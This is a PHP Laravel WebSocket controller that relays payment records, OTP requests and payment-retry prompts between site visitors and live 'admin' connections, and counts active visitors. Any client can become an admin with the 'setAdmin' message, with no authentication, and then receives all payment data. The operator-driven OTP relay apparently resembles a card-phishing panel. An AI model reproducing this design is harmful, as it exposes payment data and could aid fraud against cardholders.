<?php

namespace App\Http\Controllers;

use App\Models\Visitor;
use Ratchet\MessageComponentInterface;
use Ratchet\ConnectionInterface;
use App\Models\Payment;

class WebSocketController extends Controller implements MessageComponentInterface
{
    private $connections = [];
    private $admins = [];

    function onOpen(ConnectionInterface $conn){
        $this->connections[$conn->resourceId] = compact('conn') + ['user_id' => null];
        print_r("A new user is logging in.\n");
        Visitor::create();
        $message = [
            'type' => 'updateActiveCount',
            'payment' => null,
            'count' => $this->getActiveCount()
        ];
        foreach ($this->admins as $admin) {
            $admin->send(json_encode($message));
        }
    }

    function onClose(ConnectionInterface $conn){
        $id = $conn->resourceId;
        if (array_key_exists($id, $this->admins))
        {
            print_r("An admin is logging off.\n");
            unset($this->admins[$id]);
            unset($this->connections[$id]);
        }
        else
        {
            if (is_null($this->connections[$id]['user_id']))
            {
                print_r("A user without payment info is logging off.\n");
                unset($this->connections[$id]);
                $message = [
                    'type' => 'updateActiveCount',
                    'payment' => null,
                    'count' => $this->getActiveCount()
                ];
                foreach ($this->admins as $admin) {
                    $admin->send(json_encode($message));
                }
            }
            else {
                print_r("A user with payment info is logging off.\n");
                $payment = Payment::find($this->connections[$id]['user_id']);
                if ($payment) {
                    $payment->quit = 1;
                    $payment->save();
                }

                unset($this->connections[$id]);

                $message = [
                    'type' => 'updateActiveCount',
                    'payment' => $payment,
                    'count' => $this->getActiveCount()
                ];
                foreach ($this->admins as $admin) {
                    $admin->send(json_encode($message));
                }
            }
        }
    }

    function onError(ConnectionInterface $conn, \Exception $e){
        $userId = $this->connections[$conn->resourceId]['user_id'];
        echo "An error has occurred with user $userId: {$e->getMessage()}\n";
        unset($this->connections[$conn->resourceId]);
        $conn->close();
    }

    function onMessage(ConnectionInterface $conn, $msg){
        $msg = json_decode($msg, true);

        switch ($msg['type']) {
            case "setAdmin":
                print_r("An admin " . $conn->resourceId.  " is logging in.\n");
                $this->admins[$conn->resourceId] = $conn;
                Visitor::latest()->first()->delete();
                $message = [
                    'type' => 'updateActiveCount',
                    'payment' => null,
                    'count' => $this->getActiveCount()
                ];
                foreach ($this->admins as $admin) {
                    $admin->send(json_encode($message));
                }
                break;

            case "paymentCreated":
                $id = $msg['id'];
                $this->connections[$conn->resourceId]['user_id'] = $id;
                $payment = Payment::find($id);

                print_r("PaymentCreated event was received.\n");
                $message = [
                    'type' => 'paymentCreated',
                    'payment' => $payment,
                ];
                foreach ($this->admins as $admin) {
//                    print_r("An admin " . $conn->resourceId.  "is logging in.\n");
                    $admin->send(json_encode($message));
                }

                $messageToSender = [
                    'type' => 'paymentCreated',
                    'data' => $payment,
                ];
                $conn->send(json_encode($messageToSender));
                break;

           case 'verifyOTP':
                $id = $msg['id'];
                $payment = Payment::find($id);

                if ($payment == null) return;

                $message = [
                    'type' => 'otpVerified',
                    'payment' => $payment,
                ];
                print_r("verifyOTP event was received.\n");
                foreach ($this->admins as $admin) {
//                    print_r("An admin " . $conn->resourceId.  "is logging in.\n");
                    $admin->send(json_encode($message));
                }
                break;

            case 'updateStatus':
                $id = $msg['id'];
                $payment = Payment::find($id);

                if ($payment == null) return;

                $message = [
                    'type' => 'updateStatus',
                    'payment' => $payment,
                ];
//                print_r("updateStatus event was received.\n");
                foreach ($this->admins as $admin) {
                    $admin->send(json_encode($message));
                }
                break;

            case 'askOTP':
                $id = $msg['id'];
                $error = $msg['error'];
                $data = Payment::find($id);

                if ($data == null) return;

                $message = [
                    'type' => 'askOTP',
                    'data' => $data,
                    'error' => $error,
                ];

                print_r("askOTP event was received.\n");
                $msgJSON = json_encode($message);

                $to = $this->findConnection($id);
                if ($to)
                    $to['conn']->send($msgJSON);

                foreach ($this->admins as $admin) {
//                    print_r("admin ".$admin->resourceId."\n");
                    $admin->send($msgJSON);
                }
                break;

            case 'approvalRequired':
                $id = $msg['id'];
                $error = $msg['error'];
                $data = Payment::find($id);

                if ($data == null) return;

                $message = [
                    'type' => 'approvalRequired',
                    'data' => $data,
                    'error' => $error,
                ];

                print_r("approvalRequired event was received.\n");
                $msgJSON = json_encode($message);

                $to = $this->findConnection($id);
                if ($to)
                    $to['conn']->send($msgJSON);

                foreach ($this->admins as $admin) {
//                    print_r("admin ".$admin->resourceId."\n");
                    $admin->send($msgJSON);
                }
                break;

            case 'repeatPayment':
                $id = $msg['id'];
                $data = Payment::find($id);

                if ($data == null) return;

                $text = $msg['text'];
                $message = [
                    'type' => 'repeatPayment',
                    'data' => $data,
                    'message' => $text,
                ];

                print_r("repeatPayment event was received.\n");
                $msgJSON = json_encode($message);

                $to = $this->findConnection($id);
                if ($to)
                    $to['conn']->send($msgJSON);

                foreach ($this->admins as $admin) {
//                    print_r("admin ".$admin->resourceId."\n");
                    $admin->send($msgJSON);
                }
                break;

            case 'delete':
                $ids = $msg['ids'];
                $message = [
                    'type' => 'delete',
                    'ids' => $ids,
                ];

                print_r("delete event was received.\n");
                $msgJSON = json_encode($message);
                foreach ($this->admins as $admin) {
//                    print_r("admin ".$admin->resourceId."\n");
                    $admin->send($msgJSON);
                }
                break;

            case 'deleteAll':
                $msgJSON = json_encode(['type' => 'deleteAll']);
                print_r("deleteAll event was received.\n");
                foreach ($this->admins as $admin) {
//                    print_r("admin ".$admin->resourceId."\n");
                    $admin->send($msgJSON);
                }
                break;
        }
    }

    function findConnection($userId) {
        foreach ($this->connections as $connection) {
            if ($connection['user_id'] == $userId)
                return $connection;
        }
        return null;
    }

    function getActiveCount() {
        // Get number of all connections
        $allCount = count($this->connections);
        // Get number of admin connections
        $adminCount = count($this->admins);
        return $allCount - $adminCount;
    }

    function findPayment($userId) {
        return Payment::find($userId);
    }
}
